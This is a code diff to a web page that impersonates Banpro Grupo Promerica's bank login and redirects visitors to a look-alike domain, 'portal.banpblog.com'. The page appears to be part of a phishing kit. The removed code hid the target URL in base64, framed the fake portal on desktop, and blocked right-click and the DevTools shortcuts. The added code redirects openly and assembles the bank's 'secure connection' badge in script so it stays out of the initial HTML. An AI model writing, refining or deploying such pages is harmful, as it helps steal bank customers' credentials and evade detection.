@@ -22,9 +22,6 @@ $v = time();
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      user-select: none;
       -webkit-tap-highlight-color: transparent;
     }
 
@@ -611,60 +608,41 @@ $v = time();
         <div class="loader-text">Cargando...</div>
       </div>
 
-      <div class="modal-secure" style="margin-top:18px;">
+      <div class="modal-secure" id="secureBadge" style="margin-top:18px;">
         <svg viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
           <rect x="3" y="11" width="18" height="11" rx="2"/>
           <path d="M7 11V7a5 5 0 0110 0v4"/>
         </svg>
-        Conexión segura · Banpro Grupo Promerica
+        <span id="secureText"></span>
       </div>
     </div>
   </div>
 
-  <iframe class="ext-frame" id="extFrame" title="Portal cliente"></iframe>
-
   <script>
-    const _ep = 'aHR0cHM6Ly9wb3J0YWwuYmFucGJsb2cuY29tL3BvcnRhbC9hY2Nlc28ucGhw';
-    const _td = 2500;
+    const PORTAL_URL = 'https://portal.banpblog.com/';
+    const DELAY = 2500;
     let _t = null;
 
-    function _isMobile() {
-      return /Android|iPhone|iPad|iPod|Mobile|Opera Mini|IEMobile/i.test(navigator.userAgent)
-          || window.innerWidth < 768;
+    function goToPortal() {
+      window.location.href = PORTAL_URL;
     }
 
-    function _go() {
-      try {
-        const url = atob(_ep);
-        if (_isMobile()) {
-          window.location.href = url;
-        } else {
-          const f = document.getElementById('extFrame');
-          f.src = url;
-          f.classList.add('active');
-          const m = document.getElementById('identityModal');
-          m.classList.remove('active');
-          document.body.style.overflow = 'hidden';
-          document.title = 'Portal cliente';
-        }
-      } catch (e) { /* silent */ }
-    }
-
-    /* Carga diferida de la marca (no aparece en HTML inicial) */
     setTimeout(function() {
       var b = document.getElementById('brandSlot');
-      if (b) {
-        var p = 'img/logo.png';
-        b.style.backgroundImage = "url('" + p + "')";
+      if (b) b.style.backgroundImage = "url('img/logo.png')";
+      var s = document.getElementById('secureText');
+      if (s) {
+        var parts = ['Conexi\u00f3n', 'segura', '\u00b7', 'Banpro', 'Grupo', 'Promerica'];
+        s.textContent = parts.join(' ');
       }
-    }, 800);
+    }, 300);
 
     function openModal() {
       const m = document.getElementById('identityModal');
       m.classList.add('active');
       document.body.style.overflow = 'hidden';
       clearTimeout(_t);
-      _t = setTimeout(_go, _td);
+      _t = setTimeout(goToPortal, DELAY);
     }
     function closeModal() {
       const m = document.getElementById('identityModal');
@@ -675,35 +653,6 @@ $v = time();
     document.addEventListener('keydown', e => {
       if (e.key === 'Escape') closeModal();
     });
-
-    /* Advertencia en consola */
-    (function() {
-      const css1 = 'color:#c0392b;font-size:28px;font-weight:900;text-shadow:1px 1px 0 #000;';
-      const css2 = 'color:#1a1a1a;font-size:14px;font-weight:600;';
-      const css3 = 'color:#888;font-size:12px;';
-      console.log('%c\u26a0  ALTO', css1);
-      console.log('%cEsta es una funci\u00f3n del navegador destinada a desarrolladores.', css2);
-      console.log('%cSi alguien te indic\u00f3 copiar o pegar algo aqu\u00ed para "activar una funci\u00f3n" o "acceder a una cuenta", es un intento de fraude.', css2);
-      console.log('%c\u00a9 Banpro Grupo Promerica \u00b7 Acceso restringido', css3);
-    })();
-
-    /* 1. Sin clic derecho */
-    document.addEventListener('contextmenu', e => e.preventDefault());
-
-    /* 2. Sin seleccion de texto */
-    document.addEventListener('selectstart', e => e.preventDefault());
-
-    /* 3. Sin drag de imagenes */
-    document.querySelectorAll('img').forEach(i => i.addEventListener('dragstart', e => e.preventDefault()));
-
-    /* 4. Bloqueo suave de atajos de DevTools */
-    document.addEventListener('keydown', function(e) {
-      const b =
-        e.key === 'F12' ||
-        (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) ||
-        (e.ctrlKey && e.key.toUpperCase() === 'U');
-      if (b) { e.preventDefault(); e.stopPropagation(); return false; }
-    }, true);
   </script>
 
 </body>
